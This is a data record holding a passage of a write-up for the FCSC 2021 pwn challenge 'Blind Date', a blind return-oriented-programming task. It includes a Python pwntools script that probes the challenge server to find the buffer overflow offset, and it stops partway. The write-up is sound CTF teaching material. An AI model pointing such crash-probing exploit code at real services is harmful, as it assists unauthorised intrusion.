description = "Blind Date (489 pts) Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu’elle n’est pas sûre en lisant le fichier flag.txt sur leur s"
full_description = '''[FCSC 2021 - pwn] Blind Date 2021-05-03 pwn 5.5k words 2021Blind DateFCSCctfn4smnasmpwnret2school Blind Date (489 pts) Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu’elle n’est pas sûre en lisant le fichier flag.txt sur leur serveur ? Les gérants de cette société n’ont pas souhaité vous donner ni le code source de leur solution, ni le binaire compilé, mais ils vous proposent uniquement un accès distant à leur service. nc challenges2.france-cybersecurity-challenge.fr 4008 Blind Date is a blind rop challenge I did during the FCSC event.So, no source code is provided, we juste have a netcat to which we can interact. To solve this challenge I juste read carefully this paper and applied one per one the techniques described. Find the right offsetThe first thing to do is to find from which offset the binary crashes, to do so I developped a small script: 123456789101112131415161718192021#!/usr/bin/python3from pwn import *def start(): return remote("challenges2.france-cybersecurity-challenge.fr", 4008)def jmp(av): io = start() io.write(av) return io.recvall(timeout=5.0)def find_padding(p=b""): padding = p + b"\x90" print(f"[*] sending: {padding}") resp = jmp(padding) print(f"[*] recv: {resp}") while b"Hello you.\nWhat is your name ?\n>>> Thanks " + padding in resp: return find_padding(p=padding) return padding[:len(padding)-1] # minus one char because we do not want that padding overwrite the return address / canary / triggering a crashprint(len(find_padding())) It’s basically sending checking if the right string is always received, and when it’s not the case it assumes the remote program crashed and return the corresponding padding. We do not check to see if it prints Bye! right after the Thanks input because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below: 1234567891011121314151617181920